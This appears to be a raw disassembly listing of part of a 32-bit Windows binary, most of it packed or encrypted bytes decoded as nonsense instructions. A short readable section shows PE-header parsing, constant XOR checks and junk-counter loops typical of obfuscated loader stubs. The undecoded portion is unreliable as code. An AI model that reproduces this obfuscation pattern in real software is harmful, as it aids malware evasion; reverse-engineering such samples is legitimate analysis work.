  4179b5:	shr    BYTE PTR [esp+esi*1+0x51],1
  4179b9:	jle    0x4179c2
  4179bb:	push   cs
  4179bc:	arpl   cx,bp
  4179be:	fs mov eax,0x2f18f50
  4179c4:	inc    esp
  4179c5:	outs   dx,DWORD PTR ds:[esi]
  4179c6:	push   0x6
  4179c8:	and    DWORD PTR [eax+0xf],edi
  4179cb:	inc    ebp
  4179cc:	or     ebp,DWORD PTR [ecx+0x44]
  4179cf:	(bad)  
  4179d0:	fbld   TBYTE PTR [edx+0x7d]
  4179d3:	aam    0xe1
  4179d5:	push   0xffffff8f
  4179d7:	arpl   WORD PTR [edi-0x5d5e07f7],si
  4179dd:	jne    0x4179e0
  4179df:	dec    esi
  4179e0:	dec    ebp
  4179e1:	je     0x41798c
  4179e3:	les    esp,FWORD PTR [ebx]
  4179e5:	repnz scas eax,DWORD PTR es:[edi]
  4179e7:	cwde   
  4179e8:	fisubr WORD PTR [ecx]
  4179ea:	(bad)  
  4179eb:	pop    eax
  4179ec:	int    0x4b
  4179ee:	stos   DWORD PTR es:[edi],eax
  4179ef:	call   0x37f6:0xd8a36579
  4179f6:	test   edi,ebx
  4179f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179f9:	mov    ch,0x55
  4179fb:	add    BYTE PTR [esp+ecx*2-0xa],dl
  4179ff:	leave  
  417a00:	mov    ebx,0xe17bcf8c
  417a05:	mov    cl,0x14
  417a07:	les    ebp,FWORD PTR [esi+0x4f2f22f]
  417a0d:	fadd   st(2),st
  417a0f:	cmc    
  417a10:	mov    DWORD PTR [ebp+0x40152390],0xe7b8854f
  417a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1b:	add    eax,0x8c444f8d
  417a20:	out    0xbe,al
  417a22:	das    
  417a23:	and    BYTE PTR [eax],dh
  417a25:	out    dx,eax
  417a26:	aas    
  417a27:	mov    ebx,ebx
  417a29:	inc    edx
  417a2a:	inc    ebp
  417a2b:	push   ebx
  417a2c:	and    ecx,esp
  417a2e:	mov    ebp,0x657f80a4
  417a33:	or     ebp,DWORD PTR [ebp+0x4f9e8514]
  417a39:	in     al,dx
  417a3a:	and    eax,0xbe62fe95
  417a3f:	pop    edi
  417a40:	(bad)  
  417a41:	jg     0x4179eb
  417a43:	(bad)  
  417a44:	jmp    0x5c47633e
  417a49:	fild   DWORD PTR ds:0x66616ebe
  417a4f:	mov    esi,0x727a4df7
  417a54:	sti    
  417a55:	fs pop ebp
  417a57:	pusha  
  417a58:	add    DWORD PTR [esi+0x112fce40],eax
  417a5e:	loop   0x417a41
  417a60:	loop   0x417a48
  417a62:	cmp    eax,0x526f90c9
  417a67:	fisub  DWORD PTR [eax-0x7932ecda]
  417a6d:	sar    DWORD PTR [esi-0x61],1
  417a70:	jecxz  0x4179f8
  417a72:	mov    bh,0x1f
  417a74:	mov    ds:0x4ab20e9b,eax
  417a79:	test   eax,0xfdfd489a
  417a7e:	jge    0x417a53
  417a80:	and    BYTE PTR [ebx-0x16],ah
  417a83:	(bad)
  417a87:	inc    esp
  417a88:	inc    esi
  417a89:	mov    edi,0x9b45c4be
  417a8e:	sub    al,0x6b
  417a90:	outs   dx,DWORD PTR ds:[esi]
  417a91:	add    DWORD PTR [esi+edx*1-0x4944bd83],ebx
  417a98:	(bad)  
  417a99:	popa   
  417a9a:	ds xchg ebx,eax
  417a9c:	adc    dl,dh
  417a9e:	or     eax,0xe10de273
  417aa3:	jge    0x417a6d
  417aa5:	stos   BYTE PTR es:[edi],al
  417aa6:	mov    ah,0x6
  417aa8:	(bad)
  417aab:	scas   al,BYTE PTR es:[edi]
  417aac:	adc    eax,0xbc1c2ab0
  417ab1:	push   edi
  417ab2:	jne    0x417b12
  417ab4:	(bad)  
  417ab5:	pop    ecx
  417ab6:	xor    BYTE PTR [edx-0xb],cl
  417ab9:	dec    ecx
  417aba:	adc    eax,0xdc2e52a7
  417abf:	push   eax
  417ac0:	fsubr  QWORD PTR [esi+0x5e]
  417ac3:	popf   
  417ac4:	jecxz  0x417ae5
  417ac6:	dec    esp
  417ac7:	sbb    eax,0x26c9ecda
  417acc:	pop    es
  417acd:	xor    esp,DWORD PTR [eax-0x3f7eddb4]
  417ad3:	je     0x417b02
  417ad5:	call   0xce9c566b
  417ada:	lods   eax,DWORD PTR ds:[esi]
  417adb:	out    dx,eax
  417adc:	loope  0x417b50
  417ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417adf:	les    ebp,FWORD PTR es:[edi*4+0x22c5424a]
  417ae7:	(bad)  
  417ae8:	cmp    ebx,DWORD PTR [eax+0x68]
  417aeb:	dec    esp
  417aec:	inc    esp
  417aed:	push   ebp
  417aee:	push   cs
  417aef:	rcl    BYTE PTR [ebx],cl
  417af1:	jmp    0x1bee55c3
  417af6:	aam    0xca
  417af8:	mov    eax,0xdc43ad50
  417afd:	mov    WORD PTR [ecx+0x68b301c],es
  417b03:	or     BYTE PTR [edi-0x7c82c07a],dh
  417b09:	push   ecx
  417b0a:	rol    DWORD PTR [eax+0x17b4bdf1],0x86
  417b11:	adc    edi,ebp
  417b13:	test   al,0x3e
  417b15:	mov    edx,0xda4dcc30
  417b1a:	test   eax,0x3af0de22
  417b1f:	icebp  
  417b20:	mov    edi,0xd9a33006
  417b25:	or     eax,0x4f8efd1e
  417b2a:	or     BYTE PTR [esi-0x66],dh
  417b2d:	mov    eax,0x3af000e0
  417b32:	or     esi,ebx
  417b34:	sbb    dl,dh
  417b36:	jb     0x417ad3
  417b38:	lock fst st(3)
  417b3b:	mov    dl,0x77
  417b3d:	adc    eax,0x687ca48b
  417b42:	pop    esi
  417b43:	jmp    0x4d4a2409
  417b48:	repz adc al,0xca
  417b4b:	(bad)  
  417b4c:	repz sub eax,0x25a6eb5
  417b52:	shl    dl,1
  417b54:	xlat   BYTE PTR ds:[ebx]
  417b55:	(bad)  
  417b56:	rcl    dl,1
  417b58:	ja     0x417bb5
  417b5a:	popf   
  417b5b:	inc    esp
  417b5c:	adc    ebp,DWORD PTR [eax+esi*2-0x14]
  417b60:	es inc esi
  417b62:	retf   0x1cfc
  417b65:	cmp    ah,dh
  417b67:	push   ecx
  417b68:	xchg   esp,eax
  417b69:	jecxz  0x417b81
  417b6b:	add    DWORD PTR [ebx],ebx
  417b6d:	mov    ecx,0x6c9e60e
  417b72:	add    BYTE PTR [edi+0x77],cl
  417b75:	ss mov esi,0xe0c09102
  417b7b:	popf   
  417b7c:	mov    edx,esi
  417b7e:	xor    eax,0x683dd547
  417b83:	sbb    esp,esi
  417b85:	dec    esp
  417b86:	dec    esi
  417b87:	(bad)  
  417b88:	shl    DWORD PTR [esi-0x694b7cc4],cl
  417b8e:	mov    ds:0x521de510,eax
  417b93:	and    BYTE PTR [esi-0x4b34d996],0x50
  417b9a:	pop    es
  417b9b:	adc    edx,ebx
  417b9d:	xor    al,ah
  417b9f:	ins    DWORD PTR es:[edi],dx
  417ba0:	mov    ds:0xc44a7b0,eax
  417ba5:	inc    ecx
  417ba6:	sbb    edx,DWORD PTR [eax]
  417ba8:	lods   al,BYTE PTR ds:[esi]
  417ba9:	(bad)  [ecx+0x7185bdd9]
  417baf:	out    0xc7,al
  417bb1:	xor    eax,0xee6b1b3d
  417bb6:	jl     0x417b9b
  417bb8:	sbb    esi,esp
  417bba:	mov    al,ds:0x9265b447
  417bbf:	push   cs
  417bc0:	mov    al,ds:0x5ecd2918
  417bc5:	xchg   ebp,eax
  417bc6:	mov    bh,0x6c
  417bc8:	or     al,0x18
  417bca:	jns    0x417c19
  417bcc:	xchg   edi,eax
  417bcd:	inc    ecx
  417bce:	lock xchg ebx,eax
  417bd0:	pop    esp
  417bd1:	dec    edi
  417bd2:	push   DWORD PTR [eax-0x77]
  417bd5:	push   cs
  417bd6:	imul   ecx,DWORD PTR [ecx-0x7c6a1b55],0xe6922eab
  417be0:	call   0x208c:0x608fe855
  417be7:	gs jbe 0x417c26
  417bea:	sub    al,0x23
  417bec:	int3   
  417bed:	retf   
  417bee:	jns    0x417c55
  417bf0:	sbb    al,0x25
  417bf2:	add    bl,cl
  417bf4:	adc    al,BYTE PTR ds:0xf2f81e77
  417bfa:	sub    BYTE PTR [eax-0x58],0x6d
  417bfe:	popf   
  417bff:	iret   
  417c00:	xchg   esi,eax
  417c01:	mov    eax,ds:0x5f1723b8
  417c06:	lock mov bh,BYTE PTR ds:0xa1d60ab2
  417c0d:	sbb    BYTE PTR [edi+0x78d227a5],0x98
  417c14:	jg     0x417bb6
  417c16:	jecxz  0x417bd0
  417c18:	push   0x16
  417c1a:	mov    ds:0x272ea70a,al
  417c1f:	repnz dec esp
  417c21:	pop    ss
  417c22:	les    esi,FWORD PTR [ebx+0x6a350fce]
  417c28:	outs   dx,DWORD PTR ds:[esi]
  417c29:	rcr    ebp,cl
  417c2b:	pop    edi
  417c2c:	ja     0x417c0d
  417c2e:	sub    BYTE PTR [ebx],ah
  417c30:	mov    dl,0xfe
  417c32:	enter  0xbd0d,0x90
  417c36:	pop    esi
  417c37:	ds mov cs,esp
  417c3a:	lods   al,BYTE PTR ds:[esi]
  417c3b:	cmc    
  417c3c:	fs push cs
  417c3e:	hlt    
  417c3f:	xchg   DWORD PTR [ecx+edx*2+0x3f],edx
  417c43:	nop
  417c44:	rcl    DWORD PTR [edi+edi*4-0x45],0xd9
  417c49:	jo     0x417c08
  417c4b:	neg    BYTE PTR [ebx-0x794f485b]
  417c51:	dec    esi
  417c52:	popf   
  417c53:	xlat   BYTE PTR ds:[ebx]
  417c54:	(bad)  
  417c55:	jno    0x417c25
  417c57:	fsub   st,st(7)
  417c59:	dec    esi
  417c5a:	dec    esp
  417c5b:	in     al,dx
  417c5c:	mov    DWORD PTR [eax],ebp
  417c5e:	mov    dh,0xba
  417c60:	std    
  417c61:	call   0x22d0:0xc265bec0
  417c68:	xor    dh,ch
  417c6a:	fistp  QWORD PTR [eax+0x7fcfa3f7]
  417c70:	cld    
  417c71:	fmul   st(2),st
  417c73:	lea    eax,[ebx-0x78]
  417c76:	in     al,0x42
  417c78:	sbb    edx,DWORD PTR [ecx]
  417c7a:	and    BYTE PTR [edx+0x10],bl
  417c7d:	test   esp,eax
  417c7f:	jb     0x417cd8
  417c81:	ret    
  417c82:	cld    
  417c83:	lea    ebp,[ebx+edi*1]
  417c86:	mov    esi,0x65caf1a8
  417c8b:	fstp   QWORD PTR ds:[ebp-0x5d]
  417c8f:	pop    ds
  417c90:	pop    ebp
  417c91:	or     eax,0x86c9f4ad
  417c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c97:	retf   
  417c98:	xor    eax,0x71770ea6
  417c9d:	mov    eax,0xa4059e8f
  417ca2:	mov    bh,0x8
  417ca4:	mov    bl,0x86
  417ca6:	dec    edi
  417ca7:	(bad)  
  417ca8:	out    dx,al
  417ca9:	add    al,0xae
  417cab:	add    eax,DWORD PTR [edi]
  417cad:	or     cl,al
  417caf:	shl    BYTE PTR ds:[edx-0x5c],0xc8
  417cb4:	dec    edx
  417cb5:	in     eax,dx
  417cb6:	inc    ebx
  417cb7:	mov    al,0xb2
  417cb9:	outs   dx,BYTE PTR ds:[esi]
  417cba:	int    0x66
  417cbc:	data16 out dx,ax
  417cbf:	inc    eax
  417cc0:	out    0x18,al
  417cc2:	jns    0x417ca7
  417cc4:	adc    BYTE PTR [edx-0x283f4118],ch
  417cca:	addr16 mov esp,0x5b3baa36
  417cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd1:	or     dh,0x54
  417cd4:	adc    ah,BYTE PTR [edi-0x4b]
  417cd7:	push   cs
  417cd8:	xchg   BYTE PTR [edx],ch
  417cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cdb:	cmp    al,0xcb
  417cdd:	enter  0x5a0b,0x62
  417ce1:	aad    0x33
  417ce3:	adc    BYTE PTR [ecx],0x5b
  417ce6:	or     dh,dh
  417ce8:	inc    edx
  417ce9:	or     BYTE PTR [ebx-0x21],dl
  417cec:	pusha  
  417ced:	sahf   
  417cee:	pop    eax
  417cef:	aaa    
  417cf0:	loop   0x417d4e
  417cf2:	lods   eax,DWORD PTR ds:[esi]
  417cf3:	dec    eax
  417cf4:	pop    es
  417cf5:	ins    DWORD PTR es:[edi],dx
  417cf6:	push   edx
  417cf7:	cmp    al,0x23
  417cf9:	dec    edi
  417cfa:	(bad)  
  417cfb:	or     edx,DWORD PTR [ebp-0x49]
  417cfe:	adc    eax,0x7730bf13
  417d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d04:	xor    BYTE PTR [ebx-0x7c],ah
  417d07:	outs   dx,BYTE PTR ds:[esi]
  417d08:	sub    ebx,ebp
  417d0a:	mov    ds:0xafa718db,al
  417d0f:	sub    bl,bl
  417d11:	jl     0x417d65
  417d13:	mov    bl,0xca
  417d15:	in     eax,0xcd
  417d17:	dec    ebp
  417d18:	fwait
  417d19:	push   esi
  417d1a:	and    dl,BYTE PTR [edx+ebx*8]
  417d1d:	popf   
  417d1e:	sub    al,BYTE PTR [eax-0x5c6e5b11]
  417d24:	push   edi
  417d25:	add    eax,0x64ee25c
  417d2a:	adc    dh,al
  417d2c:	xor    eax,DWORD PTR [ebx-0x4df95721]
  417d32:	adc    BYTE PTR [esi+0x707493b2],bl
  417d38:	push   ds
  417d39:	mov    cl,0xd2
  417d3b:	out    0x7e,eax
  417d3d:	jp     0x417d12
  417d3f:	jno    0x417d87
  417d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d42:	xchg   edi,eax
  417d43:	xchg   edx,eax
  417d44:	mov    al,0xfd
  417d46:	mov    ds:0xc5cb214,eax
  417d4b:	pop    eax
  417d4c:	mov    al,ds:0x72904555
  417d51:	nop
  417d52:	in     eax,dx
  417d53:	js     0x417d3f
  417d55:	in     eax,0x68
  417d57:	(bad)  
  417d58:	xor    ebx,ecx
  417d5a:	shl    BYTE PTR [esi],1
  417d5c:	iret   
  417d5d:	sub    bl,BYTE PTR [ecx+0x39c2160a]
  417d63:	test   al,0xa5
  417d65:	pop    eax
  417d66:	sbb    DWORD PTR [esi],0xd55044b4
  417d6c:	inc    eax
  417d6d:	mov    cl,0x1
  417d6f:	aaa    
  417d70:	jecxz  0x417d26
  417d72:	call   0x3938:0x7f21c0f0
  417d79:	adc    DWORD PTR [ebp-0x27],ebp
  417d7c:	jnp    0x417d9b
  417d7e:	in     eax,0xca
  417d80:	or     eax,0x6003fb61
  417d85:	rcl    bl,cl
  417d87:	xchg   ebp,eax
  417d88:	mov    ebp,0x290fb879
  417d8d:	cmp    edi,edi
  417d8f:	lds    eax,FWORD PTR [edx-0x6d]
  417d92:	push   edx
  417d93:	stos   BYTE PTR es:[edi],al
  417d94:	jbe    0x417ddc
  417d96:	push   eax
  417d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d98:	sub    al,0xf7
  417d9a:	add    eax,0x9cd54e0a
  417d9f:	(bad)  
  417da0:	ins    BYTE PTR es:[edi],dx
  417da1:	scas   al,BYTE PTR es:[edi]
  417da2:	das    
  417da3:	in     eax,0x1f
  417da5:	sbb    dl,BYTE PTR [ecx+ebp*2]
  417da8:	jecxz  0x417dc0
  417daa:	add    esi,esp
  417dac:	(bad)  
  417dad:	(bad)  
  417dae:	out    dx,al
  417daf:	std    
  417db0:	dec    eax
  417db1:	sub    bl,BYTE PTR [eax+0x176ebdbb]
  417db7:	adc    al,0x10
  417db9:	pop    dx
  417dbb:	ret    
  417dbc:	xchg   esp,eax
  417dbd:	(bad)  
  417dbe:	mov    eax,ds:0xcca33747
  417dc3:	gs jl  0x417daa
  417dc6:	shr    DWORD PTR [edx+edi*1],1
  417dc9:	repz mov cl,0x43
  417dcc:	neg    BYTE PTR [ebp+0x5]
  417dcf:	adc    ebx,ecx
  417dd1:	inc    edx
  417dd2:	arpl   WORD PTR [edi],ax
  417dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd5:	sub    bl,BYTE PTR [ebx-0x3b2fa707]
  417ddb:	sti    
  417ddc:	daa    
  417ddd:	dec    eax
  417dde:	fadd   QWORD PTR [ecx-0x56b87d7e]
  417de4:	fsub   DWORD PTR [esp+esi*2+0x4a]
  417de8:	fwait
  417de9:	cwde   
  417dea:	pop    ebp
  417deb:	push   eax
  417dec:	fisubr DWORD PTR [edx+0x4a]
  417def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417df0:	rcl    BYTE PTR [eax+0x3c496a07],cl
  417df6:	jp     0x417e33
  417df8:	lds    ebx,FWORD PTR [eax+0x56e69d05]
  417dfe:	add    al,0xaa
  417e00:	lods   eax,DWORD PTR ds:[esi]
  417e01:	shr    BYTE PTR [edx],cl
  417e03:	ret    0xb0b
  417e06:	mov    ah,0x6
  417e08:	in     al,dx
  417e09:	mov    dl,0x5a
  417e0b:	or     DWORD PTR [ebx-0x23],ecx
  417e0e:	push   esi
  417e0f:	pop    edi
  417e10:	sbb    al,0xc8
  417e12:	int    0x7f
  417e14:	push   0xf877152e
  417e19:	ds jmp 0xa54a:0xb7979fba
  417e21:	mov    al,0xfd
  417e23:	pop    ecx
  417e24:	adc    al,0xf
  417e26:	mov    BYTE PTR [edx],bh
  417e28:	icebp  
  417e29:	dec    eax
  417e2a:	inc    esp
  417e2b:	fstp   DWORD PTR [ebp+0x6b]
  417e2e:	test   ch,0x8d
  417e31:	pop    edi
  417e32:	inc    esp
  417e33:	shr    DWORD PTR [ebx+0x64],cl
  417e36:	xchg   ecx,eax
  417e37:	dec    eax
  417e38:	inc    esp
  417e39:	push   ebp
  417e3a:	jno    0x417ddc
  417e3c:	jmp    0x417e2c
  417e3e:	mov    ah,0xe
  417e40:	aaa    
  417e41:	sub    eax,0x8bbbdb34
  417e46:	js     0x417e69
  417e48:	mov    ds:0xbf91972f,al
  417e4d:	sar    BYTE PTR [ebp+eiz*2-0x7653a1a2],cl
  417e54:	mov    ecx,0xd9174a4e
  417e59:	jne    0x417ead
  417e5b:	stc    
  417e5c:	sbb    cl,0x7b
  417e5f:	fisttp WORD PTR [ebp-0x1126d90b]
  417e65:	push   esi
  417e66:	or     DWORD PTR [ebx+0x1d114f8a],ecx
  417e6c:	jne    0x417eb2
  417e6e:	fild   DWORD PTR [eax+0x43]
  417e71:	jg     0x417ef0
  417e73:	mov    ?,WORD PTR [esi]
  417e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e76:	mov    eax,ds:0x16520104
  417e7b:	arpl   WORD PTR [esi],sp
  417e7d:	inc    edx
  417e7e:	inc    esi
  417e7f:	jo     0x417e85
  417e81:	push   esp
  417e82:	mov    al,0x49
  417e84:	stos   BYTE PTR es:[edi],al
  417e85:	push   0xffffffb6
  417e87:	and    DWORD PTR [eax+0x5a],esi
  417e8a:	fistp  WORD PTR [ebp-0x7192b705]
  417e90:	jl     0x417ec7
  417e92:	arpl   bx,ax
  417e94:	xchg   esi,eax
  417e95:	pushf  
  417e96:	adc    al,0xff
  417e98:	aaa    
  417e99:	sbb    BYTE PTR [edi-0x80],al
  417e9c:	adc    BYTE PTR [edi],al
  417e9e:	inc    edx
  417e9f:	adc    al,0xa9
  417ea1:	push   ds
  417ea2:	inc    DWORD PTR ds:0xbcd8cbde
  417ea8:	and    cl,BYTE PTR [ecx-0x3d777292]
  417eae:	cwde   
  417eaf:	push   0x8516263
  417eb4:	sahf   
  417eb5:	dec    ecx
  417eb6:	imul   edx,DWORD PTR [eax-0x2e],0x8185f31a
  417ebd:	jae    0x417f2e
  417ebf:	arpl   WORD PTR [ebp+0x1e7be728],bp
  417ec5:	arpl   WORD PTR [esp+ecx*8-0xa7aa3f1],bx
  417ecc:	xor    ebp,esp
  417ece:	repnz outs dx,DWORD PTR ds:[esi]
  417ed0:	sub    al,0x8c
  417ed2:	shl    BYTE PTR [ecx+0x6fb742e0],0x92
  417ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eda:	mov    ebx,0xe4a0023e
  417edf:	pop    edi
  417ee0:	arpl   WORD PTR [edx-0x2c0859e],cx
  417ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee7:	loop   0x417ed4
  417ee9:	xchg   ebp,eax
  417eea:	inc    ebx
  417eeb:	inc    edx
  417eec:	inc    ebp
  417eed:	push   ss
  417eee:	aas    
  417eef:	mov    al,0x54
  417ef1:	out    dx,eax
  417ef2:	sbb    BYTE PTR [ebp-0x40854eb9],bh
  417ef8:	push   edx
  417ef9:	imul   esi,DWORD PTR [esi],0x4d5c4e6d
  417eff:	in     eax,dx
  417f00:	fs sbb eax,0x5e7dc8b2
  417f06:	loopne 0x417eb1
  417f08:	xchg   edi,eax
  417f09:	sbb    ch,BYTE PTR [ebp+0x2d]
  417f0c:	adc    DWORD PTR [ecx],ecx
  417f0e:	retf   0xac72
  417f11:	xor    al,0x5e
  417f13:	fs cmp ah,al
  417f16:	aam    0xbb
  417f18:	mov    dh,BYTE PTR [edx+0x4c]
  417f1b:	mov    ebx,0x472c19b5
  417f20:	mov    eax,0x8a0a08da
  417f25:	add    BYTE PTR [ecx+0x43300405],al
  417f2b:	add    BYTE PTR [esi+0x24],cl
  417f2e:	add    BYTE PTR [eax],al
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x433014,0x43000c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x431010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x42f024,0x14
  417faf:	cmp    DWORD PTR ds:0x42f024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x42f024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x431000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x42b034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x42f024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x42f024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x432010,0x1b
  418001:	cmp    DWORD PTR ds:0x432010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x432010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x42b038
  418029:	mov    ecx,DWORD PTR ds:0x432010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x432010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42474b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41e0ac
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x433010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x43301c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x43301c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x43301c,ecx
  418091:	cmp    DWORD PTR ds:0x43301c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x43301c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x432004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x42b000
  4180c4:	cmp    DWORD PTR ds:0x43301c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x43301c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x43301c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	and    eax,0xfdd2118c
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x4]
  418120:	add    ah,BYTE PTR [edi-0x44]
  418123:	cwde   
  418124:	jg     0x4180c0
  418126:	pusha  
  418127:	cdq    
  418128:	out    dx,eax
  418129:	pop    edi
  41812a:	cmp    eax,0x33338f1e
  41812f:	jle    0x418120
  418131:	xchg   edi,eax
  418132:	mov    edi,0x57a3a84d
  418137:	leave  
  418138:	loopne 0x41816b
  41813a:	add    DWORD PTR [ebp+0x4ead14e9],0x5324dba
  418144:	or     eax,0x77d09cad
  418149:	sub    cl,BYTE PTR [ecx+0x43]
  41814c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814d:	stos   DWORD PTR es:[edi],eax
  41814e:	mov    ah,0x14
  418150:	or     DWORD PTR [edi+0x26764c1b],ebx
  418156:	jns    0x418163
  418158:	push   ecx
  418159:	call   0xc75e:0xe03c0ef0
  418160:	push   ds
  418161:	nop
  418162:	or     al,0xb3
  418164:	out    dx,al
  418165:	sub    eax,0x37ff0858
  41816a:	les    ebp,FWORD PTR gs:0x2d5e337f
  418171:	dec    ecx
  418172:	add    al,0x2
  418174:	mov    BYTE PTR [ecx-0x43],dl
  418177:	push   ds
  418178:	(bad)
  41817b:	mov    WORD PTR ds:0x3f110730,ds
  418181:	ror    DWORD PTR [ebp-0x49],cl
  418184:	imul   eax,DWORD PTR ds:0x4f654e75,0xffffffa9
  41818b:	lahf   
  41818c:	push   esp
  41818d:	test   al,0x5f
  41818f:	daa    
  418190:	dec    ebp
  418191:	out    dx,eax
  418192:	repz xor eax,0x854d38a8
  418198:	jae    0x418154
  41819a:	or     al,0xdb
  41819c:	js     0x41817e
  41819e:	mov    ds:0x6fd3785b,al
  4181a3:	xchg   edx,eax
  4181a4:	ror    BYTE PTR [ebx-0x7a690537],1
  4181aa:	(bad)  
  4181ab:	add    edi,DWORD PTR [edx-0x7a]
  4181ae:	mov    ds:0xd9f944ac,eax
  4181b3:	std    
  4181b4:	cwde   
  4181b5:	jne    0x418174
  4181b7:	sahf   
  4181b8:	js     0x41815b
  4181ba:	test   al,0xc1
  4181bc:	add    al,0x12
  4181be:	aam    0xd3
  4181c0:	jmp    0x9748:0x2fb195e1
  4181c7:	std    
  4181c8:	push   esi
  4181c9:	inc    eax
  4181ca:	mov    edx,0x87c56732
  4181cf:	or     eax,0xfded2100
  4181d4:	cmp    eax,0x237c5024
  4181d9:	push   esi
  4181da:	xchg   esp,eax
  4181db:	or     edi,DWORD PTR [eax+0x35e19b1c]
  4181e1:	cmp    dl,cl
  4181e3:	sbb    esi,DWORD PTR [edi-0x34b200d3]
  4181e9:	imul   ebp,DWORD PTR [edi+edx*1],0x900685f4
  4181f0:	neg    eax
  4181f2:	cli    
  4181f3:	push   edi
  4181f4:	lods   eax,DWORD PTR ds:[esi]
  4181f5:	mul    BYTE PTR [ecx-0x1c74af0c]
  4181fb:	or     BYTE PTR [ebp-0x4f9823e1],ch
  418201:	ins    DWORD PTR es:[edi],dx
  418202:	leave  
  418203:	inc    edx
  418204:	jge    0x41824b
  418206:	xor    BYTE PTR [edx+0x34],al
  418209:	mov    al,0x18
  41820b:	fisttp DWORD PTR [edx-0x60]
  41820e:	pop    es
  41820f:	(bad)  
  418210:	adc    eax,0x350a2eba
  418215:	push   eax
  418216:	mov    WORD PTR [edx+0x2d815c31],fs
  41821c:	lea    esp,[ebp+0x47df86a8]
  418222:	inc    edi
  418223:	dec    esi
  418224:	out    0xf0,eax
  418226:	dec    ebx
  418227:	cwde   
  418228:	outs   dx,DWORD PTR ds:[esi]
  418229:	mov    ebp,0xcdc26f4c
